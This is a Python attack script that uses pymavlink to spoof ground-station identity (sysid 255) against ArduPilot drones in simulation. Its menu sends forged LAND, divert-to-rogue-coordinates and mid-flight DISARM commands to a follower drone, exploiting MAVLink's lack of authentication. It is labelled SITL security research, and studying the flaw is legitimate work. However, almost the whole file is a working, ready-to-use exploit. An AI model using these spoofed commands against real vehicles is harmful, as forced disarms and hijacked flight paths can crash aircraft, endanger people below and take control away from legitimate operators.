#!/usr/bin/env python3
"""
Compromised Drone Sysid Spoof Attack
--------------------------------------
Scenario:
  - Drone1 (sysid=1): flies an autonomous waypoint mission (AUTO mode)
  - Drone2 (sysid=2): mirrors Drone1's position (GUIDED, background thread)
  - Drone3 (sysid=3): follows Drone2 at +20m north offset (GUIDED, background thread)

Attack:
  Drone2 is "compromised". It opens a second connection to Drone3's port
  and forges source_system=255 (GCS identity) in the MAVLink header.
  ArduPilot has no authentication — Drone3 cannot distinguish real GCS
  commands from spoofed ones injected by a compromised peer.

For SITL security research only.
"""

from pymavlink import mavutil
import time
import threading

# ── config ───────────────────────────────────────────────────────────────────

DRONE1_URI,  DRONE1_SYSID  = "udp:127.0.0.1:14551", 1
DRONE2_URI,  DRONE2_SYSID  = "udp:127.0.0.1:14561", 2
DRONE3_URI,  DRONE3_SYSID  = "udp:127.0.0.1:14571", 3

WPL_FILE    = "../missions/drone1.wpl"
TAKEOFF_ALT = 30        # metres, must match WPL altitude

FOLLOW_OFFSET_X = 20.0  # Drone3 trails Drone2 by 20m north (NED x-axis)
FOLLOW_OFFSET_Y = 0.0
FOLLOW_OFFSET_Z = 0.0   # same altitude (NED: z negative = up, 0 offset = match Drone2)

ROGUE_LAT = -35.3600    # spoofed divert destination (~500m from SITL home)
ROGUE_LON =  149.1700
ROGUE_ALT =  30.0


# ── connection ───────────────────────────────────────────────────────────────

def connect(uri, name, source_system=255):
    print(f"[+] Connecting to {name} @ {uri}")
    c = mavutil.mavlink_connection(uri, source_system=source_system)
    c.wait_heartbeat()
    print(f"[+] Heartbeat from {name}")
    return c


# ── mode / arm / takeoff ─────────────────────────────────────────────────────

def set_mode(conn, sysid, mode_str):
    mode_id = conn.mode_mapping()[mode_str]
    conn.mav.set_mode_send(
        sysid,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        mode_id
    )
    time.sleep(0.5)


def arm(conn, sysid, name):
    print(f"[*] Arming {name}...")
    set_mode(conn, sysid, "GUIDED")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0, 1, 0, 0, 0, 0, 0, 0
    )
    for _ in range(30):
        msg = conn.recv_match(type="HEARTBEAT", blocking=True, timeout=1)
        if msg and (msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED):
            print(f"[+] {name} armed.")
            return True
        time.sleep(0.5)
    print(f"[-] {name} failed to arm. Try: param set ARMING_CHECK 0 in MAVProxy.")
    return False


def takeoff(conn, sysid, name, alt):
    print(f"[*] Takeoff {name} -> {alt}m")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
        0, 0, 0, 0, 0, 0, 0, alt
    )


# ── mission upload ────────────────────────────────────────────────────────────

def parse_wpl(path):
    waypoints = []
    with open(path) as f:
        lines = f.readlines()
    assert lines[0].strip().startswith("QGC WPL"), "Not a valid QGC WPL file."
    for line in lines[1:]:
        line = line.strip()
        if not line:
            continue
        parts = line.split()
        if len(parts) < 12:
            continue
        seq      = int(parts[0])
        current  = int(parts[1])
        frame    = int(parts[2])
        command  = int(parts[3])
        p1, p2, p3, p4 = float(parts[4]), float(parts[5]), float(parts[6]), float(parts[7])
        x, y, z  = float(parts[8]), float(parts[9]), float(parts[10])
        autocont = int(parts[11])
        waypoints.append((seq, current, frame, command, p1, p2, p3, p4, x, y, z, autocont))
    return waypoints


def upload_mission(conn, sysid, waypoints):
    print(f"[*] Uploading {len(waypoints)} waypoints to sysid={sysid}...")
    indexed = [
        (i, cur, fr, cmd, p1, p2, p3, p4, x, y, z, ac)
        for i, (_, cur, fr, cmd, p1, p2, p3, p4, x, y, z, ac) in enumerate(waypoints)
    ]
    conn.mav.mission_count_send(sysid, 0, len(indexed))
    sent = 0
    while sent < len(indexed):
        msg = conn.recv_match(type=["MISSION_REQUEST", "MISSION_REQUEST_INT"],
                              blocking=True, timeout=5)
        if not msg:
            print(f"[-] No MISSION_REQUEST (sent {sent}/{len(indexed)})")
            return False
        req_seq = msg.seq
        if req_seq >= len(indexed):
            print(f"[-] Vehicle requested out-of-range seq {req_seq}")
            return False
        seq, cur, fr, cmd, p1, p2, p3, p4, x, y, z, ac = indexed[req_seq]
        conn.mav.mission_item_int_send(
            sysid, 0, seq, fr, cmd, cur, ac,
            p1, p2, p3, p4,
            int(x * 1e7), int(y * 1e7), z
        )
        sent += 1
    ack = conn.recv_match(type="MISSION_ACK", blocking=True, timeout=5)
    if ack and ack.type == mavutil.mavlink.MAV_MISSION_ACCEPTED:
        print("[+] Mission upload accepted.")
        return True
    print(f"[-] Mission upload failed. ACK: {ack}")
    return False


def start_mission(conn, sysid):
    print("[*] Starting AUTO mission on Drone1...")
    set_mode(conn, sysid, "AUTO")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_MISSION_START,
        0, 0, 0, 0, 0, 0, 0, 0
    )


# ── background threads ────────────────────────────────────────────────────────

def thread_drone2_mirrors_drone1(d1_conn, d2_conn, stop_event):
    """T1: Drone2 follows Drone1 via GLOBAL_POSITION_INT at 5 Hz."""
    while not stop_event.is_set():
        msg = d1_conn.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=1)
        if not msg:
            continue
        lat = msg.lat / 1e7
        lon = msg.lon / 1e7
        alt = msg.relative_alt / 1000.0
        if alt < 1.0:
            continue
        d2_conn.mav.send(mavutil.mavlink.MAVLink_set_position_target_global_int_message(
            0, DRONE2_SYSID, 0,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            0b0000111111111000,
            int(lat * 1e7), int(lon * 1e7), alt,
            0, 0, 0, 0, 0, 0, 0, 0
        ))
        time.sleep(0.2)


def thread_drone3_follows_drone2(d2_conn, d3_conn, stop_event):
    """T2: Drone3 follows Drone2 at +20m north offset via LOCAL_NED at 10 Hz."""
    while not stop_event.is_set():
        msg = d2_conn.recv_match(type="LOCAL_POSITION_NED", blocking=True, timeout=1)
        if not msg:
            continue
        # NED z is negative when airborne; skip if not yet up
        if msg.z > -2.0:
            continue
        time_boot_ms = int((time.time() * 1000) % 0xFFFFFFFF)
        d3_conn.mav.set_position_target_local_ned_send(
            time_boot_ms,
            DRONE3_SYSID, 0,
            mavutil.mavlink.MAV_FRAME_LOCAL_NED,
            0b0000111111111000,
            msg.x + FOLLOW_OFFSET_X,
            msg.y + FOLLOW_OFFSET_Y,
            msg.z + FOLLOW_OFFSET_Z,
            0, 0, 0,
            0, 0, 0,
            0, 0
        )
        time.sleep(0.1)


# ── spoofed attack functions ──────────────────────────────────────────────────

def spoof_land(spoof_conn):
    print(f"[SPOOFED GCS / sysid=255 -> Drone3] LAND injected")
    spoof_conn.mav.command_long_send(
        DRONE3_SYSID, 0,
        mavutil.mavlink.MAV_CMD_NAV_LAND,
        0, 0, 0, 0, 0, 0, 0, 0
    )


def spoof_goto(spoof_conn):
    print(f"[SPOOFED GCS / sysid=255 -> Drone3] GOTO ({ROGUE_LAT}, {ROGUE_LON}, {ROGUE_ALT}m) injected")
    # Switch Drone3 to GUIDED via MAV_CMD_DO_SET_MODE (avoids mode_mapping() lookup)
    # ArduCopter GUIDED = custom mode 4
    spoof_conn.mav.command_long_send(
        DRONE3_SYSID, 0,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE,
        0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        4,  # GUIDED
        0, 0, 0, 0, 0
    )
    time.sleep(0.5)
    spoof_conn.mav.send(mavutil.mavlink.MAVLink_set_position_target_global_int_message(
        0, DRONE3_SYSID, 0,
        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
        0b0000111111111000,
        int(ROGUE_LAT * 1e7), int(ROGUE_LON * 1e7), ROGUE_ALT,
        0, 0, 0, 0, 0, 0, 0, 0
    ))


def spoof_disarm(spoof_conn):
    print(f"[SPOOFED GCS / sysid=255 -> Drone3] DISARM injected (mid-flight!)")
    spoof_conn.mav.command_long_send(
        DRONE3_SYSID, 0,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0, 0, 21196, 0, 0, 0, 0, 0
    )


ATTACKS = {
    "1": ("LAND   (spoofed GCS -> Drone3)",           spoof_land),
    "2": ("GOTO   (divert Drone3 to rogue coords)",   spoof_goto),
    "3": ("DISARM (mid-flight via sysid spoof)",      spoof_disarm),
}


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    print("""
==========================================================
  COMPROMISED DRONE SYSID SPOOF — SITL Security Research
==========================================================
  Drone1 (sysid=1)  ->  AUTO waypoint mission
  Drone2 (sysid=2)  ->  mirrors Drone1 [legitimate]
  Drone3 (sysid=3)  ->  follows Drone2 at +20m N [legitimate]

  ** Drone2 is COMPROMISED **
  It forges source_system=255 (GCS sysid) to inject commands
  into Drone3. MAVLink has no authentication — Drone3 cannot
  distinguish real GCS traffic from the spoof.
==========================================================
""")

    # --- connect legitimate connections ---
    d1 = connect(DRONE1_URI, "Drone1")
    d2 = connect(DRONE2_URI, "Drone2")
    d3 = connect(DRONE3_URI, "Drone3")

    # --- set up spoofed identity on d3's connection ---
    # In SITL, each drone has its own port so true peer-to-peer injection
    # requires the existing connection. In a real shared MAVLink bus (serial,
    # mesh radio), Drone2 would broadcast directly. We simulate that here by
    # reusing d3's connection with srcSystem forged to 255 (GCS sysid).
    # The vulnerability is identical: ArduPilot accepts the command with zero
    # authentication regardless of which node sent it.
    print(f"[*] Forging GCS identity on Drone3 connection (srcSystem -> 255)...")
    d3.mav.srcSystem = 255   # already 255 by pymavlink default, made explicit
    print(f"[SPOOF] Ready. Attack packets will carry sysid=255 (GCS impersonation).")
    spoof = d3  # alias for clarity in attack functions

    # --- arm all three ---
    for conn, sysid, name in [(d1, DRONE1_SYSID, "Drone1"),
                               (d2, DRONE2_SYSID, "Drone2"),
                               (d3, DRONE3_SYSID, "Drone3")]:
        if not arm(conn, sysid, name):
            return

    # --- takeoff all three ---
    for conn, sysid, name in [(d1, DRONE1_SYSID, "Drone1"),
                               (d2, DRONE2_SYSID, "Drone2"),
                               (d3, DRONE3_SYSID, "Drone3")]:
        takeoff(conn, sysid, name, TAKEOFF_ALT)

    print("[*] Waiting 5s for all drones to reach altitude...")
    time.sleep(5)

    # --- upload and start Drone1 mission ---
    waypoints = parse_wpl(WPL_FILE)
    if not upload_mission(d1, DRONE1_SYSID, waypoints):
        return
    start_mission(d1, DRONE1_SYSID)

    # --- start background follow threads ---
    stop_event = threading.Event()
    t1 = threading.Thread(target=thread_drone2_mirrors_drone1, args=(d1, d2, stop_event), daemon=True)
    t2 = threading.Thread(target=thread_drone3_follows_drone2,  args=(d2, d3, stop_event), daemon=True)
    t1.start()
    t2.start()
    print("[*] Follow threads active. Drone2 mirroring Drone1. Drone3 trailing Drone2.")

    # --- attack menu ---
    print("""
==========================================================
  ROGUE GCS ATTACK MENU
  Commands sent via Drone2's spoofed sysid=255 connection.
  Drone1 and Drone2 are NOT targeted.
""")
    for k, (label, _) in ATTACKS.items():
        print(f"    {k} -> {label}")
    print("    q -> quit")
    print("==========================================================\n")

    try:
        while True:
            choice = input("Attack [sysid=255 spoof]: ").strip().lower()
            if choice == "q":
                stop_event.set()
                print("[*] Exiting. Drone1 continues AUTO. Drone2/Drone3 on their own.")
                break
            if choice in ATTACKS:
                label, fn = ATTACKS[choice]
                print(f"\n[!!!] ATTACK: {label}")
                fn(spoof)
                print(f"[NOTE] Drone1 and Drone2 unaffected — attack targeted via sysid spoof.\n")
            else:
                print("Unknown input. Options: 1  2  3  q")
    except KeyboardInterrupt:
        stop_event.set()
        print("\n[*] Interrupted. Stopping.")


if __name__ == "__main__":
    main()
